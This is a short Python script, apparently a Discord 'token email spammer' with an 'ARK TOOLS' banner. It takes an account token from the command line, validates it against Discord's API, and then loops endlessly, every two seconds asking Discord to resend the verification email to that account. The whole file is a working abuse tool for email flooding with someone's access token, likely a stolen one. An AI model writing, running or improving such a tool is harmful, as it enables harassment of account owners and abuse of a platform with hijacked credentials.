import os
import sys
import requests
from time import sleep
from colorama import Fore

def logo():
    print(f'''{Fore.RED}
 █████╗ ██████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
██╔══██╗██╔══██╗██║ ██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
███████║██████╔╝█████╔╝        ██║   ██║   ██║██║   ██║██║     ███████╗
██╔══██║██╔══██╗██╔═██╗        ██║   ██║   ██║██║   ██║██║     ╚════██║
██║  ██║██║  ██║██║  ██╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝                                                                   
''')

logo()

class kasra:
    def __init__(self, token):
        self.token = token
        self.headers = {"authorization": self.token, "user-agent": "Mozilla/5.0"}
    
    def remove_token_email(self):
        requests.get(
            "https://canary.discordapp.com/api/v8/guilds/0/members", 
            headers=self.headers
        )
    def resend_verification_email(self):
        r = requests.post(
            "https://discord.com/api/v8/auth/verify/resend", 
            headers=self.headers
        )
        if r.status_code == 204:
            print(f"{Fore.RED}[+]{Fore.RESET} Email Send successfull")
        else:
            print(f"{Fore.GREEN}[-]{Fore.RESET} Email Not send")

    def spam_token_email(self):
        self.remove_token_email()
        while True:
            sleep(2)
            self.resend_verification_email()
def main():
    if len(sys.argv) < 2:
        print(f'{Fore.RED}[+]{Fore.RESET} python spammer.py </Token>')
        sys.exit()
    token = sys.argv[1]
    r = requests.get('https://discord.com/api/v9/users/@me', headers={"authorization": token})
    if r.status_code == 200:
        print(f"{Fore.RED}[+]{Fore.RESET} Token Found :)")
        sleep(1)
        os.system('cls')
        pass
    else:
        print(f"{Fore.GREEN}[-]{Fore.RESET} Token Not Found")
        sys.exit()
    kasra(token).spam_token_email()

if __name__ == '__main__':
    main()